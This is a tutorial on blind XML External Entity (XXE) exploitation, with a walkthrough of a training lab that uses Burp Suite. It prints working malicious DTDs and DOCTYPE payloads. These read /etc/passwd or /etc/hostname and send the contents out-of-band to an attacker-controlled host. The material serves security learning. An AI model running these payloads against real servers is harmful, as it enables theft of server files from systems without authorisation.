# Exploiting XXE to Extract Files, Perform SSRF, and Handle Blind XXE üö®

XXE (XML External Entity) is a vulnerability that allows attackers to extract files from a server, perform SSRF attacks, and exploit "blind" XXE vulnerabilities. This guide covers all these scenarios with detailed examples. üí°

---

Using Blind XXE to Exfiltrate Data Out-of-Band

Detecting a blind XXE vulnerability using out-of-band methods is useful, but it doesn‚Äôt demonstrate how the vulnerability can be exploited to extract data. An attacker can leverage a malicious DTD hosted on their system and invoke it through an XXE payload to exfiltrate data.

### Example of a Malicious DTD

A malicious DTD to extract the contents of the `/etc/passwd` file might look like this:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
%eval;
%exfiltrate;
```

This DTD performs the following steps:

1. Defines a parameter entity `file` containing the contents of the `/etc/passwd` file.
2. Defines an entity `eval` that declares a dynamic entity `exfiltrate`. This entity sends the file contents to the attacker's server via an HTTP request.
3. Uses the `eval` entity to declare `exfiltrate`.
4. Invokes `exfiltrate`, sending the file data to the attacker‚Äôs server.

### Execution Steps

1. **Hosting the Malicious DTD**: The attacker hosts the malicious DTD on their server, for example, at:
   ```
   http://web-attacker.com/malicious.dtd
   ```

2. **Sending the Payload**: The attacker sends the following XXE payload to the application:
   ```xml
   <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://web-attacker.com/malicious.dtd"> %xxe;]>
   ```
   This payload instructs the XML parser to fetch the DTD from the attacker's server and execute its content.

3. **Exfiltrating Data**: The execution of the DTD results in the contents of `/etc/passwd` being sent to the attacker‚Äôs server.

### Limitations of the Method

Some XML parsers may block newline characters found in `/etc/passwd`. In such cases, files without newlines, like `/etc/hostname`, can be targeted instead. Alternatively, the FTP protocol can sometimes be used instead of HTTP.

---

## Example Lab Exercise

In this lab, the "Check Stock" function processes XML input data but does not display the result.

To solve the lab, exfiltrate the contents of the `/etc/hostname` file.

### Steps to Execute

### 1. Select a Product
Open the product list and choose any item:

![Product List](https://github.com/user-attachments/assets/420f18e2-6900-4413-81f2-7cc5c6103444)

---

### 2. Click the Button
On the product page, click the **"Check Stock"** button after enabling a proxy tool (e.g., Burp Suite):

![Check Stock Button](https://github.com/user-attachments/assets/c12710e3-0520-47a9-b507-1bb41849a7df)

---

### 3. Prepare the DTD
Create a malicious DTD using your Burp Collaborator subdomain:
```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://YOUR-COLLABORATOR-SUBDOMAIN/?x=%file;'>">
%eval;
%exfiltrate;
```

Host this file on your server.

![Creating the Malicious DTD](https://github.com/user-attachments/assets/2d285da5-b706-498d-b9d1-b063b2144334)

---

### 4. Intercept the Request
Navigate to **Proxy ‚Üí HTTP History**, select the POST request to `/product/stock`, and send it to **Repeater**:

![POST Request](https://github.com/user-attachments/assets/1ec0f44b-554a-44e4-ad05-c76a4c4857a8)

---

### 5. Insert the Payload
Add the following external entity definition between the XML declaration and the `stockCheck` element:
```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```

![Inserting the Payload](https://github.com/user-attachments/assets/8d98ee3a-4293-4d50-8625-7b0f8f900f60)

---

### 6. Check Collaborator
Go to the **Collaborator** tab and click **"Poll now"**. If no interactions are listed, wait a few seconds and try again. You should see DNS and HTTP interactions initiated by the application as a result of your payload.

![Checking Interactions](https://github.com/user-attachments/assets/95a9db28-ab4b-4259-8e06-871d778d7741)

---

## Helpful Tips üîç

- **Test each XML node** for potential entity injection.
- **Use proxy tools** (e.g., Burp Suite) to analyze and modify requests.
- **Iterate your actions**: from inserting entities to validating results in Collaborator.
